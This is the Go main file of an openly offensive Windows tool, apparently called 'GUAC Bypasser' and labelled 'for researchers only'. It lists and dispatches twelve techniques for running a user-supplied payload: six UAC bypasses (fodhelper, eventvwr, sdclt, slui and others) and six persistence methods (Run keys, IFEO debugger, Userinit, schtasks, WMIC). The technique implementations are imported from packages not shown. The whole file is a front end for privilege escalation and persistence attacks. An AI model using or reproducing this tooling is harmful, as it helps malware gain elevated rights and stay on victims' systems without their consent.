package main

import (
	"flag"
	"fmt"
	"log"
	"os"

	once "./src/once"
	pers "./src/persistence"

	tablewriter "github.com/0x9ef/tablewriter"
)

func logotype() string {
	var pLogo string = `
    _____  __  __  ___   _____   ___                                            
   / ___/ / / / / / _ | / ___/  | _ )  _  _   _ __   __ _   ___  ___  ___   _ _ 
  / (_ / / /_/ / / __ |/ /__    | _ \ | || | | '_ \ / _  | (_-< (_-< / -_) | '_|
  \___/  \____/ /_/ |_|\___/    |___/  \_, | | .__/ \__,_| /__/ /__/ \___| |_|
    For researchers only               |__/  |_|           by 0x9ef`
	return pLogo
}

func main() {
	payload := flag.String("payload", "C:\\Payloads\\payload.exe", "Provide path for payload executing")
	method := flag.String("method", "fodhelper", "Provide method of UAC bypass")
	list := flag.Bool("list", false, "Provide to get list of all currently techniques implemented")
	flag.Parse()

	if *list {
		fmt.Println(logotype() + "\n\r\n\r")
		names := []string{
			"COMPUTERDEFAULTS",
			"EVENTVWR",
			"FODHELPER",
			"SDCLTCONTROL",
			"SILENTCLEANUP",
			"SLUI",
			"HKCU",
			"HKLM",
			"IFEO",
			"SCHTASKS",
			"USERINIT",
			"WMIC",
		}
		types := []string{
			"Once",
			"Once",
			"Once",
			"Once",
			"Once",
			"Once",
			"Persistence",
			"Persistence",
			"Persistence",
			"Persistence",
			"Persistence",
			"Persistence",
		}
		fixed := []string{
			"false",
			"false",
			"false",
			"true",
			"false",
			"true",
			"false",
			"false",
			"false",
			"false",
			"false",
			"false",
		}
		descs := []string{
			"Bypass UAC Once using computerdefaults and registry key manipulation",
			"Bypass UAC Once using eventvwr and registry key manipulation",
			"Bypass UAC Once using fodhelper and registry key manipulation",
			"Bypass UAC Once using sdclt (app paths) and registry key manipulation",
			"Bypass UAC Once using silentcleanup and registry key manipulation",
			"Bypass UAC Once using slui and registry key manipulation",
			"Gain persistence using HKEY_CURRENT_USER Run registry key",
			"Gain persistence using HKEY_LOCAL_MACHINE Run registry key",
			"Gain persistence using IFEO debugger registry key",
			"Gain persistence with system privilege using schtasks",
			"Gain persistence using Userinit registry key",
			"Gain persistence with system privilege using wmic",
		}
		data := [][]string{
			[]string{names[6], types[6], fixed[6], descs[6]},
			[]string{names[7], types[7], fixed[7], descs[7]},
			[]string{names[8], types[8], fixed[8], descs[8]},
			[]string{names[9], types[9], fixed[9], descs[9]},
			[]string{names[10], types[10], fixed[10], descs[10]},
			[]string{names[11], types[11], fixed[11], descs[11]},
			[]string{names[0], types[0], fixed[0], descs[0]},
			[]string{names[1], types[1], fixed[1], descs[1]},
			[]string{names[2], types[2], fixed[2], descs[2]},
			[]string{names[3], types[3], fixed[3], descs[3]},
			[]string{names[4], types[4], fixed[4], descs[4]},
			[]string{names[5], types[5], fixed[5], descs[5]},
		}

		table := tablewriter.NewWriter(os.Stdout)
		table.SetRowWidth(120)
		table.SetHeader([]string{"Name", "Type", "Fixed", "Description"})
		table.SetBorders(tablewriter.Border{Left: true, Top: false, Right: true, Bottom: false})
		table.SetCenterSeparator("|")
		table.AppendBulk(data)
		table.Render()

		return
	} else {
		if len(os.Args) != 5 {
			log.Println("[ERR] Invalid arguments length")
			flag.PrintDefaults()
			os.Exit(1)
		}

		if payload == nil || *payload == "" {
			log.Println("[ERR] Payload -payload argument mismatching")
			flag.PrintDefaults()
			os.Exit(1)
		}

		if method == nil || *method == "" {
			log.Println("[ERR] Method -method argument mismatching")
			flag.PrintDefaults()
			os.Exit(1)
		}

		p := *payload
		switch *method {
		// Once
		case "computerdefaults", "COMPUTERDEFAULTS", "0":
			if err, _ := once.NewOnceComputerDefaults(p); err != nil {
				log.Println("[ERR]:", err)
			}
		case "eventvwr", "EVENTVWR", "1":
			if err, _ := once.NewOnceEventvwr(p); err != nil {
				log.Println("[ERR]:", err)
			}
		case "fodhelper", "FODHELPER", "2":
			if err, _ := once.NewOnceFodHelper(p); err != nil {
				log.Println("[ERR]:", err)
			}
		case "sdcltcontrol", "SDCLTCONTROL", "3":
			if err, _ := once.NewOnceSdcltControl(p); err != nil {
				log.Println("[ERR]:", err)
			}
		case "silentcleanup", "SILENTCLEANUP", "4":
			if err, _ := once.NewOnceSilentCleanup(p); err != nil {
				log.Println("[ERR]:", err)
			}
		case "slui", "SLUI", "5":
			if err, _ := once.NewOnceSlui(p); err != nil {
				log.Println("[ERR]:", err)
			}

		// Persistence
		case "hkcu", "HKCU", "6":
			if err, _ := pers.NewPersistenceHKCU(p); err != nil {
				log.Println("[ERR]:", err)
			}
		case "hklm", "HKLM", "7":
			if err, _ := pers.NewPersistenceHKLM(p); err != nil {
				log.Println("[ERR]:", err)
			}
		case "ifeo", "IFEO", "8":
			if err, _ := pers.NewPersistenceIFEO(p); err != nil {
				log.Println("[ERR]:", err)
			}
		case "schtasks", "SCHTASKS", "9":
			if err, _ := pers.NewPersistenceSCHTASKS(p); err != nil {
				log.Println("[ERR]:", err)
			}
		case "userinit", "USERINIT", "10":
			if err, _ := pers.NewPersistenceUSERINIT(p); err != nil {
				log.Println("[ERR]:", err)
			}
		case "wmic", "WMIC", "11":
			if err, _ := pers.NewPersistenceWMIC(p); err != nil {
				log.Println("[ERR]:", err)
			}
		}
	}
}
